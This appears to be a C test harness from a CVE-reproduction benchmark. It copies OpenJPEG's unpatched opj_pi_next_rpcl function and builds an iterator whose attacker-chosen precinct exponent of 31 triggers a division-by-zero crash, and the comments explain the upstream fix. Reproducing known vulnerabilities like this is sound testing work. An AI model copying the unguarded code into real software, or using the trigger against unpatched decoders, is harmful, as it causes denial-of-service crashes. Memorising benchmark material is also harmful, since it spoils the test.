// cve_barebone direct-call harness for openjpeg opj_pi_next_rpcl (src/lib/openjp2/pi.c).
//
// Fix commit d27ccf01c68a31ad62b33d2dc1ba2bb1eeaafe7b adds, right after computing
//   rpx = res->pdx + levelno;
//   rpy = res->pdy + levelno;
// the guard:
//   if (rpx >= 31 || ((comp->dx << rpx) >> rpx) != comp->dx ||
//       rpy >= 31 || ((comp->dy << rpy) >> rpy) != comp->dy) { continue; }
// ("To avoid divisions by zero / undefined behaviour on shift in below tests" -- the
// upstream AFL findings referenced in the commit are sig:08 == SIGFPE).
//
// Without that guard, an attacker-controlled precinct-size exponent (res->pdy, taken
// straight from the codestream's COD/COC precinct-size field, 5 bits => 0..31) can make
// `rpy` reach exactly 31, so `comp->dy << rpy` (comp->dy has a bit set at position 1)
// shifts that bit out to position 32 and the 32-bit unsigned result is EXACTLY ZERO.
// The very next statement,
//   if (!((pi->y % (OPJ_INT32)(comp->dy << rpy) == 0) || ...))
// then evaluates `pi->y % 0` -- an integer division-by-zero trap inside
// opj_pi_next_rpcl's own body, on the very first (resno=0,y=ty0,x=tx0,compno=0)
// position it evaluates. The patched guard's `rpy >= 31` disjunct exists precisely to
// `continue` (skip) before this statement is ever reached.
//
// This harness constructs an opj_pi_iterator_t directly (attacker-controlled precinct
// geometry) and calls opj_pi_next_rpcl on it once; no JP2 container parsing is needed
// because opj_pi_next_rpcl consumes only the already-parsed pi_iterator/comp/resolution
// fields, which are exactly what a malicious codestream's COD/COC markers control.

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

// ---- Real base types (src/lib/openjp2/openjpeg.h) ----
typedef int OPJ_BOOL;
#define OPJ_TRUE 1
#define OPJ_FALSE 0

typedef char           OPJ_CHAR;
typedef unsigned char  OPJ_BYTE;
typedef int16_t  OPJ_INT16;
typedef int32_t  OPJ_INT32;
typedef uint32_t OPJ_UINT32;

#define INLINE inline

// ---- Real progression-order enum (openjpeg.h), needed for opj_poc_t's field type ----
typedef enum PROG_ORDER {
    OPJ_PROG_UNKNOWN = -1,
    OPJ_LRCP = 0,
    OPJ_RLCP = 1,
    OPJ_RPCL = 2,
    OPJ_PCRL = 3,
    OPJ_CPRL = 4
} OPJ_PROG_ORDER;

// ---- Real opj_poc_t (openjpeg.h), verbatim ----
typedef struct opj_poc {
    OPJ_UINT32 resno0, compno0;
    OPJ_UINT32 layno1, resno1, compno1;
    OPJ_UINT32 layno0, precno0, precno1;
    OPJ_PROG_ORDER prg1, prg;
    OPJ_CHAR progorder[5];
    OPJ_UINT32 tile;
    OPJ_INT32 tx0, tx1, ty0, ty1;
    OPJ_UINT32 layS, resS, compS, prcS;
    OPJ_UINT32 layE, resE, compE, prcE;
    OPJ_UINT32 txS, txE, tyS, tyE, dx, dy;
    OPJ_UINT32 lay_t, res_t, comp_t, prc_t, tx0_t, ty0_t;
} opj_poc_t;

// ---- Real pi.h structs, verbatim ----
typedef struct opj_pi_resolution {
    OPJ_UINT32 pdx, pdy;
    OPJ_UINT32 pw, ph;
} opj_pi_resolution_t;

typedef struct opj_pi_comp {
    OPJ_UINT32 dx, dy;
    OPJ_UINT32 numresolutions;
    opj_pi_resolution_t *resolutions;
} opj_pi_comp_t;

typedef struct opj_pi_iterator {
    OPJ_BYTE tp_on;
    OPJ_INT16 *include;
    OPJ_UINT32 step_l;
    OPJ_UINT32 step_r;
    OPJ_UINT32 step_c;
    OPJ_UINT32 step_p;
    OPJ_UINT32 compno;
    OPJ_UINT32 resno;
    OPJ_UINT32 precno;
    OPJ_UINT32 layno;
    OPJ_BOOL first;
    opj_poc_t poc;
    OPJ_UINT32 numcomps;
    opj_pi_comp_t *comps;
    OPJ_INT32 tx0, ty0, tx1, ty1;
    OPJ_INT32 x, y;
    OPJ_UINT32 dx, dy;
} opj_pi_iterator_t;

// ---- Real integer-math helpers opj_pi_next_rpcl calls (opj_intmath.h), verbatim ----
static INLINE OPJ_UINT32 opj_uint_min(OPJ_UINT32 a, OPJ_UINT32 b)
{
    return a < b ? a : b;
}

static INLINE OPJ_INT32 opj_int_ceildiv(OPJ_INT32 a, OPJ_INT32 b)
{
    assert(b);
    return (a + b - 1) / b;
}

static INLINE OPJ_INT32 opj_int_floordivpow2(OPJ_INT32 a, OPJ_INT32 b)
{
    return a >> b;
}

// ============================ TARGET FUNCTION (verbatim, byte-for-byte from
// data_cve/cve_69d9da07/target/original_function.c) ============================
static OPJ_BOOL opj_pi_next_rpcl(opj_pi_iterator_t * pi)
{
    opj_pi_comp_t *comp = NULL;
    opj_pi_resolution_t *res = NULL;
    OPJ_UINT32 index = 0;

    if (!pi->first) {
        goto LABEL_SKIP;
    } else {
        OPJ_UINT32 compno, resno;
        pi->first = 0;
        pi->dx = 0;
        pi->dy = 0;
        for (compno = 0; compno < pi->numcomps; compno++) {
            comp = &pi->comps[compno];
            for (resno = 0; resno < comp->numresolutions; resno++) {
                OPJ_UINT32 dx, dy;
                res = &comp->resolutions[resno];
                dx = comp->dx * (1u << (res->pdx + comp->numresolutions - 1 - resno));
                dy = comp->dy * (1u << (res->pdy + comp->numresolutions - 1 - resno));
                pi->dx = !pi->dx ? dx : opj_uint_min(pi->dx, dx);
                pi->dy = !pi->dy ? dy : opj_uint_min(pi->dy, dy);
            }
        }
    }
    if (!pi->tp_on) {
        pi->poc.ty0 = pi->ty0;
        pi->poc.tx0 = pi->tx0;
        pi->poc.ty1 = pi->ty1;
        pi->poc.tx1 = pi->tx1;
    }
    for (pi->resno = pi->poc.resno0; pi->resno < pi->poc.resno1; pi->resno++) {
        for (pi->y = pi->poc.ty0; pi->y < pi->poc.ty1;
                pi->y += (OPJ_INT32)(pi->dy - (OPJ_UINT32)(pi->y % (OPJ_INT32)pi->dy))) {
            for (pi->x = pi->poc.tx0; pi->x < pi->poc.tx1;
                    pi->x += (OPJ_INT32)(pi->dx - (OPJ_UINT32)(pi->x % (OPJ_INT32)pi->dx))) {
                for (pi->compno = pi->poc.compno0; pi->compno < pi->poc.compno1; pi->compno++) {
                    OPJ_UINT32 levelno;
                    OPJ_INT32 trx0, try0;
                    OPJ_INT32  trx1, try1;
                    OPJ_UINT32  rpx, rpy;
                    OPJ_INT32  prci, prcj;
                    comp = &pi->comps[pi->compno];
                    if (pi->resno >= comp->numresolutions) {
                        continue;
                    }
                    res = &comp->resolutions[pi->resno];
                    levelno = comp->numresolutions - 1 - pi->resno;
                    trx0 = opj_int_ceildiv(pi->tx0, (OPJ_INT32)(comp->dx << levelno));
                    try0 = opj_int_ceildiv(pi->ty0, (OPJ_INT32)(comp->dy << levelno));
                    trx1 = opj_int_ceildiv(pi->tx1, (OPJ_INT32)(comp->dx << levelno));
                    try1 = opj_int_ceildiv(pi->ty1, (OPJ_INT32)(comp->dy << levelno));
                    rpx = res->pdx + levelno;
                    rpy = res->pdy + levelno;
                    if (!((pi->y % (OPJ_INT32)(comp->dy << rpy) == 0) || ((pi->y == pi->ty0) &&
                            ((try0 << levelno) % (1 << rpy))))) {
                        continue;
                    }
                    if (!((pi->x % (OPJ_INT32)(comp->dx << rpx) == 0) || ((pi->x == pi->tx0) &&
                            ((trx0 << levelno) % (1 << rpx))))) {
                        continue;
                    }

                    if ((res->pw == 0) || (res->ph == 0)) {
                        continue;
                    }

                    if ((trx0 == trx1) || (try0 == try1)) {
                        continue;
                    }

                    prci = opj_int_floordivpow2(opj_int_ceildiv(pi->x,
                                                (OPJ_INT32)(comp->dx << levelno)), (OPJ_INT32)res->pdx)
                           - opj_int_floordivpow2(trx0, (OPJ_INT32)res->pdx);
                    prcj = opj_int_floordivpow2(opj_int_ceildiv(pi->y,
                                                (OPJ_INT32)(comp->dy << levelno)), (OPJ_INT32)res->pdy)
                           - opj_int_floordivpow2(try0, (OPJ_INT32)res->pdy);
                    pi->precno = (OPJ_UINT32)(prci + prcj * (OPJ_INT32)res->pw);
                    for (pi->layno = pi->poc.layno0; pi->layno < pi->poc.layno1; pi->layno++) {
                        index = pi->layno * pi->step_l + pi->resno * pi->step_r + pi->compno *
                                pi->step_c + pi->precno * pi->step_p;
                        if (!pi->include[index]) {
                            pi->include[index] = 1;
                            return OPJ_TRUE;
                        }
LABEL_SKIP:
                        ;
                    }
                }
            }
        }
    }

    return OPJ_FALSE;
}
// ============================ end target function ============================

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <input>\n", argv[0]);
        return 1;
    }

    // --- read the whole input file into a HEAP buffer (ASAN-guarded) ---
    FILE *f = fopen(argv[1], "rb");
    if (!f) { fprintf(stderr, "open failed\n"); return 1; }
    fseek(f, 0, SEEK_END);
    long fsz = ftell(f);
    if (fsz < 0) fsz = 0;
    fseek(f, 0, SEEK_SET);
    unsigned char *buf = (unsigned char *)malloc((size_t)fsz > 0 ? (size_t)fsz : 1);
    if (!buf) { fclose(f); return 1; }
    size_t got = fread(buf, 1, (size_t)fsz, f);
    fclose(f);

    // --- derive attacker-controlled fields from the input bytes ---
    // byte[0]: mode.  1 => trigger the missing rpy>=31 overflow guard (CWE-369
    //          division-by-zero inside opj_pi_next_rpcl's own body).
    //          anything else => a normal, non-overflowing precinct geometry.
    // bytes[1..4]: salt, little-endian, perturbs only the X-axis dx (never the Y-axis
    //          fields that drive the bug) so the corpus isn't 50 byte-identical files.
    unsigned char mode = (got >= 1) ? buf[0] : 0;
    uint32_t salt = 0;
    if (got >= 5) {
        salt = (uint32_t)buf[1] | ((uint32_t)buf[2] << 8) |
               ((uint32_t)buf[3] << 16) | ((uint32_t)buf[4] << 24);
    }

    OPJ_UINT32 comp_dx = 1u + (salt % 97u);   // small, ordinary subsampling-like value
    OPJ_UINT32 comp_dy = 2u;                  // a single low bit, real subsampling value
    OPJ_UINT32 res_pdy;                       // the attacker-controlled precinct-size
                                               // exponent (COD/COC field, 0..31)

    if (mode == 1) {
        // Malicious: precinct exponent pushed to the guard's exact boundary so
        // comp->dy << rpy shifts the component's only set bit out of the 32-bit
        // register, wrapping the shift result to 0.
        res_pdy = 31;
    } else {
        // Benign: an ordinary small precinct-size exponent, well inside range.
        res_pdy = (OPJ_UINT32)(salt % 5u); // 0..4
    }

    // --- build the pi_iterator's supporting structures on the HEAP ---
    opj_pi_resolution_t *res = (opj_pi_resolution_t *)malloc(sizeof(opj_pi_resolution_t));
    res->pdx = 0;
    res->pdy = res_pdy;
    res->pw = 1;
    res->ph = 1;

    opj_pi_comp_t *comps = (opj_pi_comp_t *)malloc(sizeof(opj_pi_comp_t));
    comps[0].dx = comp_dx;
    comps[0].dy = comp_dy;
    comps[0].numresolutions = 1;
    comps[0].resolutions = res;

    OPJ_UINT32 max_prec = res->pw * res->ph;     // 1
    OPJ_UINT32 max_res = comps[0].numresolutions; // 1
    OPJ_UINT32 numlayers = 1;

    OPJ_UINT32 step_p = 1;
    OPJ_UINT32 step_c = max_prec * step_p;
    OPJ_UINT32 step_r = 1u /*numcomps*/ * step_c;
    OPJ_UINT32 step_l = max_res * step_r;

    OPJ_INT16 *include = (OPJ_INT16 *)calloc((size_t)(numlayers + 1) * step_l, sizeof(OPJ_INT16));

    opj_pi_iterator_t pi;
    memset(&pi, 0, sizeof(pi));
    pi.tp_on = 0;
    pi.first = OPJ_TRUE;
    pi.numcomps = 1;
    pi.comps = comps;
    pi.tx0 = 0;
    pi.ty0 = 0;
    pi.tx1 = 10;
    pi.ty1 = 10;
    pi.step_p = step_p;
    pi.step_c = step_c;
    pi.step_r = step_r;
    pi.step_l = step_l;
    pi.include = include;

    pi.poc.resno0 = 0;
    pi.poc.resno1 = 1;
    pi.poc.compno0 = 0;
    pi.poc.compno1 = 1;
    pi.poc.layno0 = 0;
    pi.poc.layno1 = 1;

    OPJ_BOOL ret = opj_pi_next_rpcl(&pi);
    printf("opj_pi_next_rpcl -> %d (mode=%u pdy=%u)\n", ret, mode, res_pdy);

    free(buf);
    // (comps/res/include intentionally leaked; detect_leaks=0 in the run harness)
    return 0;
}
